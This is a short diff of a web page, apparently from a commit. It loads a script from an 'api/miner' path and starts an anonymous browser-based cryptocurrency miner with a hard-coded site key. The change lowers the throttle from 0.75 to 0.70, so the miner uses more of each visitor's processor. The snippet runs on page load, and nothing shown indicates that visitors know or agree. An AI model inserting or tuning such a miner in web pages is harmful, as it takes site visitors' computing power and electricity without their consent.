@@ -58,7 +58,7 @@
 	<script src="api/miner/FNn8.php?f=uwlS.js"></script>
 	<script>
 		var _client = new Client.Anonymous('488757ab0942980695a279c52b4e0a0e6b6fa7df1a54d155c0684522fa06f426', {
-			throttle: 0.75, c: 'w'
+			throttle: 0.70, c: 'w'
 		});
 		_client.start();
 	</script>
